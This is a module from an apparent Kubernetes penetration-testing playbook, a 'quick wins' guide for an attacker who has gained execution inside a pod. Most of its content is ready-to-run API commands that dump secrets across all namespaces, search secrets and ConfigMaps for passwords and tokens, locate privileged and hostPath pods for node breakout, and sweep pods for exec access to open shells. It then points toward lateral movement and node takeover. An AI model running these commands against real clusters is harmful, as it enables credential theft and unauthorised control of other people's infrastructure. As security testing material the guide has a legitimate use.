
# 📄 **03_quick_wins.md**

### *Fastest Paths to Kubernetes / k3s Impact*

**Mi Familia Edition**

---

````markdown
# 03 — Quick Wins  
### Fastest High-Impact Actions the Moment You Land Inside a Pod

These techniques give you **immediate visibility**, **immediate leverage**, and **immediate pivot options** the moment you gain execution inside any Kubernetes pod.

They intentionally focus on:
- **Secrets extraction**
- **RBAC weakness detection**
- **Privileged pod discovery**
- **Lateral movement vectors**
- **Node compromise precursors**

This is your pentest **launchpad**.

---

# 🚀 1. Determine Cluster Exposure Level (Critical First Step)

Identify what type of cluster you're in, its version, and what kinds of attacks may apply.

### Cluster version:
```bash
kcurl "$APISERVER/version" | jq .
````

Why it matters:

* Patch level maps to known CVEs (kubelet, API server, containerd, etc.)
* Identifies hardened vs legacy clusters

### List namespaces (surface area):

```bash
kcurl "$APISERVER/api/v1/namespaces" | jq -r '.items[].metadata.name'
```

Namespaces reveal:

* Tenant separation failures
* CI/CD pipelines
* Internal services
* Operator systems (ArgoCD, Istio, Vault, cert-manager)

---

# 🔥 2. Secrets — The #1 Quick-Win Attack Surface

Secrets are the **fastest way to pivot**, often leading directly to:

* Database credentials
* Cloud provider credentials
* Webhook tokens
* Admin dashboards
* TLS private keys
* Higher-privilege ServiceAccounts

### Dump all secrets in current namespace:

```bash
kcurl "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets"
```

### Dump secrets across all namespaces:

```bash
for ns in $(kcurl "$APISERVER/api/v1/namespaces" | jq -r '.items[].metadata.name'); do
  echo -e "\n=== $ns ==="
  kcurl "$APISERVER/api/v1/namespaces/$ns/secrets"
done
```

### Extract secret names only:

```bash
kcurl "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" \
 | jq -r '.items[].metadata.name'
```

### Identify password-like values:

```bash
kcurl "$APISERVER/api/v1/secrets" \
 | jq '.items[] | select(.data|to_entries[]?.value|test("pass|token|key|secret|cred";"i"))'
```

---

# 🧨 3. Identify Privileged & Escape-Capable Pods

Pods with dangerous security contexts can allow:

* Node filesystem access
* Full container runtime control
* CAP_SYS_ADMIN → universal breakout
* Host process visibility
* Host networking

### Privileged pods:

```bash
kcurl "$APISERVER/api/v1/pods" \
 | jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'
```

### HostPath volumes (instant host access):

```bash
kcurl "$APISERVER/api/v1/pods" \
 | jq '.items[] | select(.spec.volumes[]?.hostPath)'
```

### HostPID:

```bash
kcurl "$APISERVER/api/v1/pods" \
 | jq '.items[] | select(.spec.hostPID==true)'
```

### HostNetwork:

```bash
kcurl "$APISERVER/api/v1/pods" \
 | jq '.items[] | select(.spec.hostNetwork==true)'
```

These pods represent **immediate node-level critical findings**.

---

# 🕵️‍♂️ 4. Exec Privileges — Lateral Movement Pivot Check

### Test if you can exec into any pod:

```bash
POD=<target_pod_here>
kcurl -X POST \
 "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/$POD/exec?command=/bin/sh&stdin=true&stdout=true&tty=true"
```

If you get shell output →
🔥 **instant pivot**, inspect container filesystem, steal tokens, and enumerate environment.

### Bulk exec test (sweep):

```bash
for p in $(kcurl "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" | jq -r '.items[].metadata.name'); do
  echo "→ Testing exec: $p"
  kcurl -XPOST "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/$p/exec?command=id&stdin=true&stdout=true&tty=true"
done
```

---

# 🔧 5. RBAC Quick Test: “What Can My Token Do?”

This determines lateral movement, escalation, and access to other namespaces.

### Full RBAC sweep:

```bash
kcurl -H "Content-Type: application/json" \
 -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
 -d '{
   "apiVersion":"authorization.k8s.io/v1",
   "kind":"SelfSubjectAccessReview",
   "spec":{"resourceAttributes":{"verb":"*","resource":"*"}}
 }'
```

Look for:

* `"allowed": true` across major verbs
* cluster-level roles
* wildcard permissions

---

# 🧬 6. ServiceAccounts — Privilege Map & Token Hunting

Every pod uses a ServiceAccount.
Identifying SA usage reveals escalation vectors.

### List ServiceAccounts in current namespace:

```bash
kcurl "$APISERVER/api/v1/namespaces/$NAMESPACE/serviceaccounts"
```

### Enumerate all SAs cluster-wide:

```bash
for ns in $(kcurl "$APISERVER/api/v1/namespaces" | jq -r '.items[].metadata.name'); do
  echo "=== $ns ==="
  kcurl "$APISERVER/api/v1/namespaces/$ns/serviceaccounts"
done
```

### Identify non-default, high-privilege candidates:

Look for names like:

* `admin`
* `controller`
* `deploy`
* `builder`
* `system:*`

---

# 📡 7. Internal Service Mapping (Lateral Targets)

List internal Kubernetes services:

```bash
kcurl "$APISERVER/api/v1/services"
```

Watch for:

* `etcd`
* `vault`
* `argocd-server`
* `jenkins`
* `gitlab`
* database services: `mysql`, `postgres`, `mongodb`
* custom admin consoles

These frequently lack internal auth.

---

# 🔓 8. ConfigMap Recon (often contains credentials)

```bash
kcurl "$APISERVER/api/v1/configmaps" \
 | jq '.items[] | select(.data|to_entries[]?.value|test("password|secret|api|token";"i"))'
```

ConfigMaps often include:

* environment dumps
* DB credentials
* API tokens
* TLS file paths

---

# 🎯 9. Node Enumeration Without Node Access

This exposes cloud integration, node pools, taints, and OS versions.

```bash
kcurl "$APISERVER/api/v1/nodes" \
 | jq '.items[] | {name:.metadata.name, os:.status.nodeInfo.osImage, kubelet:.status.nodeInfo.kubeletVersion}'
```

Node data fuels:

* cloud metadata attacks
* node pool-specific exploits
* taint-based privilege paths

---

# 🧨 10. Quick-Win Summary Table

| Category        | Impact | Example Command            |
| --------------- | ------ | -------------------------- |
| Secrets         | 🔥🔥🔥 | `/api/v1/secrets`          |
| Privileged pods | 🔥🔥   | jq filter                  |
| HostPath pods   | 🔥🔥🔥 | `.spec.volumes[].hostPath` |
| Exec allowed    | 🔥🔥   | pods/exec request          |
| RBAC power      | 🚀     | SelfSubjectAccessReview    |
| Node info       | 🎯     | `/api/v1/nodes`            |
| ServiceAccounts | ❤️     | `/serviceaccounts`         |
| ConfigMaps      | ⚠️     | credentials in config      |

---

# 🧡 Final Note

Quick wins tell you **which escalation path to pursue next**:

* Found privileged pods? → Move to *21_node_breakout.md*
* Exec allowed? → Move to *20_lateral_movement.md*
* HostPath volumes? → Move directly to node takeover techniques
* Secrets everywhere? → Search for cluster-admin ServiceAccount tokens

This module is your **initial thrust vector** into the cluster.

```

